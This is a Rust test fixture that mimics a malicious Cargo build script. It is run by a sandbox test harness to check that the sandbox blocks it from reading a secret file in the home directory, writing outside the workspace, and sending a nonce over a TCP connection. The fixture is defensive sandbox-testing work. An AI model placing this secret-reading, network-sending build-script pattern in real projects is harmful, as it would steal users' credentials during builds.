// HOSTILE FIXTURE (WP-G0C). Mimics a Cargo build.rs. Compiled with the project rustc (not cargo) by
// hostile.test.mjs and run as a plain program, so it only ever runs inside the sandbox runner
// (or as the unsandboxed positive control). Performs the same attacks as postinstall.mjs:
//   secretRead      read $HOME/.vn-g0c-secret
//   outsideWrite    write $VN_G0C_OUTSIDE (outside the workspace)
//   networkConnect  connect to 127.0.0.1:$VN_G0C_PORT and send $VN_G0C_NONCE
// plus workspaceRead/workspaceWrite inside $VN_G0C_WORKSPACE. Prints one VN_G0C_REPORT line and exits 0.
use std::env;
use std::fs;
use std::io::{Error, Write};
use std::net::TcpStream;
use std::path::Path;

fn json_str(s: &str) -> String {
    let mut out = String::from("\"");
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

fn fail(e: &Error) -> String {
    let errno = match e.raw_os_error() {
        Some(n) => n.to_string(),
        None => "null".to_string(),
    };
    format!("{{\"ok\":false,\"errno\":{},\"error\":{}}}", errno, json_str(&e.to_string()))
}

fn main() {
    let var = |k: &str| env::var(k).unwrap_or_default();
    let home = var("HOME");
    let ws = var("VN_G0C_WORKSPACE");
    let nonce = var("VN_G0C_NONCE");

    let secret_read = match fs::read_to_string(Path::new(&home).join(".vn-g0c-secret")) {
        Ok(c) => format!("{{\"ok\":true,\"content\":{}}}", json_str(&c)),
        Err(e) => fail(&e),
    };

    let outside_write = match fs::write(var("VN_G0C_OUTSIDE"), format!("{}\n", nonce)) {
        Ok(()) => "{\"ok\":true}".to_string(),
        Err(e) => fail(&e),
    };

    let network_connect = match var("VN_G0C_PORT").parse::<u16>() {
        Err(_) => "{\"ok\":false,\"error\":\"VN_G0C_PORT missing\"}".to_string(),
        Ok(port) => match TcpStream::connect(("127.0.0.1", port)) {
            Ok(mut s) => match s.write_all(format!("{}\n", nonce).as_bytes()) {
                Ok(()) => "{\"ok\":true}".to_string(),
                Err(e) => fail(&e),
            },
            Err(e) => fail(&e),
        },
    };

    let workspace_read = match fs::read_to_string(Path::new(&ws).join("input.txt")) {
        Ok(c) => format!("{{\"ok\":true,\"content\":{}}}", json_str(&c)),
        Err(e) => fail(&e),
    };

    let workspace_write = match fs::create_dir_all(Path::new(&ws).join("out"))
        .and_then(|_| fs::write(Path::new(&ws).join("out").join("ok.txt"), "workspace-write-ok\n"))
    {
        Ok(()) => "{\"ok\":true}".to_string(),
        Err(e) => fail(&e),
    };

    println!(
        "VN_G0C_REPORT {{\"fixture\":\"rust-build-script\",\"secretRead\":{},\"outsideWrite\":{},\"networkConnect\":{},\"workspaceRead\":{},\"workspaceWrite\":{}}}",
        secret_read, outside_write, network_connect, workspace_read, workspace_write
    );
}
